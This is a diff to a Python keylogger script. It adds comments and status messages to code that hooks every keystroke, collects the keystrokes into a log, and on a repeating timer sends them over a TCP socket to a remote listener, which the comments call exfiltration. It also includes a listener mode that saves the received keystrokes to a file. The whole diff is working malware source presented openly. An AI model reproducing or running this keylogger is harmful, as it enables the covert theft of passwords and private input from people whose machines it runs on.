@@ -6,6 +6,7 @@ import socket
 import threading
 from datetime import datetime
 
+# Classes for good python developer standards :)!
 class Keylogger:
     def __init__(self):
         self.args = args
@@ -15,9 +16,11 @@ class Keylogger:
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
+    # Handles the keyboard events, called whenever there is a keypress
     def callback(self, event):
         name = event.name
 
+        # Format specific characters
         if len(name) > 1:
             if name == "space":
                 name = " "
@@ -31,61 +34,71 @@ class Keylogger:
 
         self.log += name
 
+    # Send log over the network
     def send_log(self):
         self.master_log += self.log
 
         if self.log:
+            # Ending timestamp
             self.end_time = datetime.now()
 
+            # Check if there is already a socket connection, if there is, do nothing
             try:
                 self.socket.connect((self.args.target, self.args.port))
             except:
                 pass
 
+            # If there is keystrokes to send, send them :^)
             if self.log:
                 self.socket.send(f"\n--- New Log Instance @ {self.time} ---\n".encode())
                 self.socket.send(self.log.encode())
                 self.socket.send(f"\n--- End Of Log Instance @ {self.end_time} ---\n".encode())
 
-            with open(self.args.outfile, "w") as f:
-                f.write(self.log)
-
         self.log = ""
 
+        # Create a timer to repeatedly exfiltrate data
         timer = threading.Timer(interval=self.interval, function=self.send_log)
         timer.start()
 
+    # For the listener - handle a received a conncetion
     def handle(self, client_socket):
+        print("[+] Receieved Connection")
         buf = b""
+        # Receive all the bytes and write them to a file
         while True:
             data = client_socket.recv(4096)
             if data:
                 buf += data
             else:
                 break
-
             with open(self.args.outfile, "w") as f:
                 f.write(buf.decode())
+                print(f"[+] Wrote data to {self.args.outfile}")
 
+    # Create the listener to receive exfiltrated data
     def listen(self):
         self.socket.bind((self.args.target, self.args.port))
         self.socket.listen(5)
 
+        # When there is a connection
         while True:
             client_socket, _ = self.socket.accept()
             client_thread = threading.Thread(target=self.handle, args=(client_socket,))
             client_thread.start()
 
+    # Start the keylogger
     def start(self):
         if self.args.listen:
             self.listen()
         else:
+            # Initialize keylogger
             try:
                 self.time = datetime.now()
                 keyboard.on_release(callback=self.callback)
                 self.send_log()
                 keyboard.wait()
 
+            # Handle a CTRL-C
             except KeyboardInterrupt:
                 sys.exit(0)
 
